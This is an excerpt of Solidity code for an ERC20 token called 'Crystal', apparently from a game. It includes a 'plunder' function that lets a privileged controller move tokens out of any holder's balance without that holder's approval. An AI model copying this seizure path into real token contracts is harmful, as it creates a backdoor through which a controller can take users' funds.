...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _plunder(address looter,address looted, uint256 amount) internal virtual {
        uint256 balance = _balances[looted];
        require(balance>=amount, "amount exceeds balance");
        _balances[looted] = balance - amount;
        _balances[looter] = _balances[looter] + amount;
    }
...
interface IToken {
    ...
    function plunder(address looter,address looted, uint256 amount) external;
    
}


contract Crystal is ERC20, Ownable, IToken {
    ...
    function additional(address to, uint256 amount)
    public
    virtual
    override
    onlyController
    ...
    function plunder(address looter,address looted, uint256 amount) public virtual override onlyController {
        _plunder(looter,looted,amount);
    }
